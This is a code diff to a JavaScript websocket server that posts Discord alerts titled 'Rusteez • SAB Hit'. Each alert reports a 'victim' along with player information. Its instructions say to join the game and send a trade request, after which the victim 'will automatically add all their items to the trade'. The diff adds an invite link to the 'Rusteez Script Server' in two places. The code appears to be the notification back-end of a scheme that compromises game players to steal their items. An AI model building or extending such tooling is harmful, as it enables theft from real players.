@@ -525,7 +525,8 @@ wss.on('connection', (ws, req) => {
                     const hitEmbed = new EmbedBuilder()
                     .setTitle("Rusteez • SAB Hit")
                     .setColor(0x2b2d31)
-                    .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
+                    .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.\n` + 
+                        `🔗 **[Rejoin Rusteez Script Server](https://discord.gg/78CmkaUhZy)**`)
                     .addFields(
                         { 
                             name: "📄 Player Information", 
@@ -556,7 +557,8 @@ wss.on('connection', (ws, req) => {
                         const publicEmbed = new EmbedBuilder()
                             .setTitle("Rusteez • SAB Hit")
                             .setColor(0x2b2d31)
-                            .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
+                            .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.\n` + 
+                                `🔗 **[Rejoin Rusteez Script Server](https://discord.gg/78CmkaUhZy)**`)
                             .addFields(
                                 { 
                                     name: "📄 Player Information", 
